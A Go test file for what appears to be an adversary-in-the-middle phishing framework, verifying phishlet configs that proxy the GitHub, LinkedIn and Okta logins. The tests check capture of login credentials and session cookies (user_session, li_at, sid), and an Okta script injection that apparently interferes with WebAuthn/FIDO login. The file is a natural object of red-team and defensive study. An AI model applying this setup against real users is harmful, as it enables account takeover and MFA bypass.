package core

import (
	"testing"
)

// loadPhishlet loads a phishlet by path with optional params, failing the test on error.
func loadPhishlet(t *testing.T, name, path string, params map[string]string) *Phishlet {
	t.Helper()
	var p *map[string]string
	if params != nil {
		p = &params
	}
	pl, err := NewPhishlet(name, path, p, nil)
	if err != nil {
		t.Fatalf("phishlet %q load failed: %v", name, err)
	}
	return pl
}

// ---- GitHub ---------------------------------------------------------------

func TestGitHub_Load(t *testing.T) {
	pl := loadPhishlet(t, "github", "../phishlets/github.yaml", nil)
	if pl.Name != "github" {
		t.Errorf("name = %q, want github", pl.Name)
	}
}

func TestGitHub_ProxyHosts(t *testing.T) {
	pl := loadPhishlet(t, "github", "../phishlets/github.yaml", nil)
	if got := len(pl.proxyHosts); got < 2 {
		t.Errorf("proxy_hosts = %d, want >= 2", got)
	}
	found := false
	for _, h := range pl.proxyHosts {
		if h.phish_subdomain == "github" && h.is_landing {
			found = true
		}
	}
	if !found {
		t.Error("no landing proxy host with phish_sub 'github'")
	}
}

func TestGitHub_AuthTokens(t *testing.T) {
	pl := loadPhishlet(t, "github", "../phishlets/github.yaml", nil)
	tokens, ok := pl.cookieAuthTokens[".github.com"]
	if !ok {
		t.Fatal("auth_tokens missing for .github.com")
	}
	required := []string{"user_session"}
	found := make(map[string]bool)
	for _, tok := range tokens {
		found[tok.name] = true
	}
	for _, k := range required {
		if !found[k] {
			t.Errorf("auth token %q missing", k)
		}
	}
}

func TestGitHub_Credentials(t *testing.T) {
	pl := loadPhishlet(t, "github", "../phishlets/github.yaml", nil)
	if pl.username.key_s != "login" {
		t.Errorf("username key = %q, want 'login'", pl.username.key_s)
	}
	if pl.password.key_s != "password" {
		t.Errorf("password key = %q, want 'password'", pl.password.key_s)
	}
}

func TestGitHub_AuthUrls(t *testing.T) {
	pl := loadPhishlet(t, "github", "../phishlets/github.yaml", nil)
	for _, want := range []string{"/session", "/sessions/two-factor"} {
		matched := false
		for _, re := range pl.authUrls {
			if re.MatchString(want) {
				matched = true
				break
			}
		}
		if !matched {
			t.Errorf("auth_url %q not matched", want)
		}
	}
}

// ---- LinkedIn -------------------------------------------------------------

func TestLinkedIn_Load(t *testing.T) {
	pl := loadPhishlet(t, "linkedin", "../phishlets/linkedin.yaml", nil)
	if pl.Name != "linkedin" {
		t.Errorf("name = %q, want linkedin", pl.Name)
	}
}

func TestLinkedIn_ProxyHosts(t *testing.T) {
	pl := loadPhishlet(t, "linkedin", "../phishlets/linkedin.yaml", nil)
	if got := len(pl.proxyHosts); got < 3 {
		t.Errorf("proxy_hosts = %d, want >= 3", got)
	}
}

func TestLinkedIn_AuthTokens(t *testing.T) {
	pl := loadPhishlet(t, "linkedin", "../phishlets/linkedin.yaml", nil)
	tokens, ok := pl.cookieAuthTokens[".linkedin.com"]
	if !ok {
		t.Fatal("auth_tokens missing for .linkedin.com")
	}
	found := make(map[string]bool)
	for _, tok := range tokens {
		found[tok.name] = true
	}
	if !found["li_at"] {
		t.Error("primary session cookie 'li_at' missing")
	}
}

func TestLinkedIn_Credentials(t *testing.T) {
	pl := loadPhishlet(t, "linkedin", "../phishlets/linkedin.yaml", nil)
	if pl.username.key_s != "session_key" {
		t.Errorf("username key = %q, want 'session_key'", pl.username.key_s)
	}
	if pl.password.key_s != "session_password" {
		t.Errorf("password key = %q, want 'session_password'", pl.password.key_s)
	}
}

func TestLinkedIn_AuthUrls(t *testing.T) {
	pl := loadPhishlet(t, "linkedin", "../phishlets/linkedin.yaml", nil)
	for _, want := range []string{"/checkpoint/lg/login-submit", "/uas/authenticate"} {
		matched := false
		for _, re := range pl.authUrls {
			if re.MatchString(want) {
				matched = true
				break
			}
		}
		if !matched {
			t.Errorf("auth_url %q not matched", want)
		}
	}
}

// ---- Okta -----------------------------------------------------------------

func TestOkta_Load(t *testing.T) {
	pl := loadPhishlet(t, "okta", "../phishlets/okta.yaml", map[string]string{"tenant": "testcorp"})
	if pl.Name != "okta" {
		t.Errorf("name = %q, want okta", pl.Name)
	}
}

func TestOkta_LoadDefaultParam(t *testing.T) {
	// Must load with default 'company' tenant when no params supplied
	pl := loadPhishlet(t, "okta", "../phishlets/okta.yaml", nil)
	if pl.Name != "okta" {
		t.Errorf("name = %q, want okta", pl.Name)
	}
}

func TestOkta_ProxyHosts(t *testing.T) {
	pl := loadPhishlet(t, "okta", "../phishlets/okta.yaml", map[string]string{"tenant": "testcorp"})
	if got := len(pl.proxyHosts); got < 4 {
		t.Errorf("proxy_hosts = %d, want >= 4", got)
	}
	found := false
	for _, h := range pl.proxyHosts {
		if h.phish_subdomain == "okta" && h.is_landing {
			found = true
		}
	}
	if !found {
		t.Error("no landing proxy host with phish_sub 'okta'")
	}
}

func TestOkta_TenantParam(t *testing.T) {
	pl := loadPhishlet(t, "okta", "../phishlets/okta.yaml", map[string]string{"tenant": "testcorp"})
	// Tenant param must be resolved in login.domain
	if pl.login.domain != "testcorp.okta.com" {
		t.Errorf("login.domain = %q, want testcorp.okta.com", pl.login.domain)
	}
	// Auth token domain must also be resolved
	if _, ok := pl.cookieAuthTokens["testcorp.okta.com"]; !ok {
		t.Error("auth_tokens domain testcorp.okta.com not found after tenant param resolution")
	}
}

func TestOkta_AuthTokens(t *testing.T) {
	pl := loadPhishlet(t, "okta", "../phishlets/okta.yaml", map[string]string{"tenant": "testcorp"})
	tokens, ok := pl.cookieAuthTokens["testcorp.okta.com"]
	if !ok {
		t.Fatal("auth_tokens missing for testcorp.okta.com")
	}
	found := make(map[string]bool)
	for _, tok := range tokens {
		found[tok.name] = true
	}
	if !found["sid"] {
		t.Error("primary session cookie 'sid' missing")
	}
}

func TestOkta_Credentials(t *testing.T) {
	pl := loadPhishlet(t, "okta", "../phishlets/okta.yaml", nil)
	if pl.username.key_s != "username" {
		t.Errorf("username key = %q, want 'username'", pl.username.key_s)
	}
	// OIE identifier field must be in custom credentials
	found := false
	for _, f := range pl.custom {
		if f.key != nil && f.key.String() == "identifier" {
			found = true
		}
	}
	if !found {
		t.Error("OIE credential field 'identifier' missing from credentials.custom")
	}
}

func TestOkta_FidoJsInject(t *testing.T) {
	pl := loadPhishlet(t, "okta", "../phishlets/okta.yaml", map[string]string{"tenant": "testcorp"})
	if len(pl.js_inject) == 0 {
		t.Fatal("js_inject section is empty")
	}
	js := pl.js_inject[0]
	if len(js.trigger_domains) == 0 || js.trigger_domains[0] != "testcorp.okta.com" {
		t.Errorf("js_inject trigger_domain = %v, want [testcorp.okta.com]", js.trigger_domains)
	}
	for _, sym := range []string{"PublicKeyCredential", "navigator.credentials.get", "NotAllowedError"} {
		if !containsStr(js.script, sym) {
			t.Errorf("js_inject script missing symbol %q", sym)
		}
	}
}

func containsStr(s, sub string) bool {
	return len(s) >= len(sub) && (s == sub || len(s) > 0 && containsSubstr(s, sub))
}

func containsSubstr(s, sub string) bool {
	for i := 0; i <= len(s)-len(sub); i++ {
		if s[i:i+len(sub)] == sub {
			return true
		}
	}
	return false
}
